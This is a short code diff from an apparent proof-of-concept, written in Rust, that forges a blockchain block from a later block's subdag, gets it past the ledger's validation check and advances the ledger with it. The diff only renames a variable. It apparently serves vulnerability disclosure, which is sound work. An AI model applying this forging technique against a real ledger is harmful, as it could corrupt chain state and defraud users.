@@ -28,13 +28,13 @@ async fn main() {
     let block_2 = client.get_block(2).await.unwrap();
 
     // ******We forged a block_1 from block_2's subdag ****
-    let block_2_forged = forge_next_block(&ledger, &block_1, &block_2);
+    let block_1_forged_from_block_2 = forge_next_block(&ledger, &block_1, &block_2);
 
     // We are at block 0, but the forged block_2 pass the validation check
-    ledger.check_next_block(&block_2_forged, &mut rand::thread_rng()).unwrap();
+    ledger.check_next_block(&block_1_forged_from_block_2, &mut rand::thread_rng()).unwrap();
     println!("WARNING: Check forged block valid");
 
-    ledger.advance_to_next_block(&block_2_forged).unwrap();
+    ledger.advance_to_next_block(&block_1_forged_from_block_2).unwrap();
     println!("WARNING: Advance successfully with a forged block!!!!");
 
 }
